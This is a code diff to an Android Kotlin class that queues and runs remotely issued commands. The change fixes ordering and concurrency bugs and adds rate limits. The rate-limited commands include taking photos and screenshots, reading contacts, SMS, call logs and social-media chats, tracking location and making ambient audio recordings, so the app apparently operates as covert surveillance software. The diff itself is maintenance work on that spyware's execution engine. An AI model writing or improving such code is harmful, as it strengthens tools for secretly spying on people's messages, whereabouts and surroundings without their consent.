@@ -59,7 +59,7 @@ class CommandQueueManager(private val context: Context) {
         override fun compareTo(other: Command): Int {
             val priorityDiff = this.priority.level - other.priority.level
             if (priorityDiff != 0) return priorityDiff
-            return (this.createdAt - other.createdAt).toInt()
+            return this.createdAt.compareTo(other.createdAt)
         }
     }
 
@@ -98,13 +98,50 @@ class CommandQueueManager(private val context: Context) {
         this.onResourceFreed = onFreed
     }
 
+    // Rate limiting: track last execution time per command type
+    private val lastExecutionTime = java.util.concurrent.ConcurrentHashMap<String, Long>()
+    private val MAX_QUEUE_SIZE = 50
+
+    // Minimum interval between same command (ms). Commands not listed: no limit.
+    private val RATE_LIMITS = mapOf(
+        "take_photo" to 3_000L,
+        "take_screenshot" to 3_000L,
+        "get_location" to 5_000L,
+        "get_contacts" to 10_000L,
+        "get_sms" to 10_000L,
+        "get_call_logs" to 10_000L,
+        "get_device_info" to 5_000L,
+        "get_installed_apps" to 10_000L,
+        "ambient_record" to 10_000L,
+        "social_media_chats" to 5_000L,
+    )
+
     /**
      * Enqueue a command for execution.
+     * Returns false if rate-limited or queue full.
      */
-    fun enqueue(command: Command) {
+    fun enqueue(command: Command): Boolean {
+        // Rate limit check
+        val minInterval = RATE_LIMITS[command.name]
+        if (minInterval != null) {
+            val lastTime = lastExecutionTime[command.name] ?: 0L
+            val elapsed = System.currentTimeMillis() - lastTime
+            if (elapsed < minInterval) {
+                Log.d(TAG, "Rate-limited: ${command.name} (${elapsed}ms < ${minInterval}ms)")
+                return false
+            }
+        }
+
+        // Queue size limit — reject LOW priority when queue is full
+        if (commandQueue.size >= MAX_QUEUE_SIZE && command.priority == Priority.LOW) {
+            Log.w(TAG, "Queue full ($MAX_QUEUE_SIZE), rejecting LOW: ${command.name}")
+            return false
+        }
+
         commandQueue.offer(command)
         Log.d(TAG, "Enqueued: ${command.name} (priority=${command.priority}, resource=${command.resource}, queue=${commandQueue.size})")
         processNext()
+        return true
     }
 
     /**
@@ -124,13 +161,18 @@ class CommandQueueManager(private val context: Context) {
      * Process next command in queue if not busy.
      */
     private fun processNext() {
-        if (isProcessing.get()) return
-        val cmd = commandQueue.poll() ?: return
+        if (!isProcessing.compareAndSet(false, true)) return
+        val cmd = commandQueue.poll()
+        if (cmd == null) {
+            isProcessing.set(false)
+            return
+        }
 
         // Check resource availability
         if (!isResourceAvailable(cmd.resource)) {
             Log.d(TAG, "Resource ${cmd.resource} busy, waiting: ${cmd.name}")
             waitingForResource.set(cmd)
+            isProcessing.set(false)
             return
         }
 
@@ -138,8 +180,8 @@ class CommandQueueManager(private val context: Context) {
     }
 
     private fun executeCommand(cmd: Command) {
-        isProcessing.set(true)
         currentCommand.set(cmd)
+        lastExecutionTime[cmd.name] = System.currentTimeMillis()
 
         scope.launch {
             Log.d(TAG, "▶ Executing: ${cmd.name} (priority=${cmd.priority})")
@@ -219,7 +261,9 @@ class CommandQueueManager(private val context: Context) {
         if (waiting != null && isResourceAvailable(waiting.resource)) {
             scope.launch {
                 delay(1000) // Wait 1s for camera to fully release
-                executeCommand(waiting)
+                // Re-enqueue instead of direct execute to go through processNext gate
+                commandQueue.offer(waiting)
+                processNext()
             }
         } else {
             processNext()
@@ -278,8 +322,12 @@ class CommandQueueManager(private val context: Context) {
                             if (waiting != null && isResourceAvailable(waiting.resource)) {
                                 scope.launch {
                                     delay(500)
-                                    executeCommand(waiting)
+                                    // Re-enqueue instead of direct execute to go through processNext gate
+                                    commandQueue.offer(waiting)
+                                    processNext()
                                 }
+                            } else {
+                                processNext()
                             }
                         }
                     }
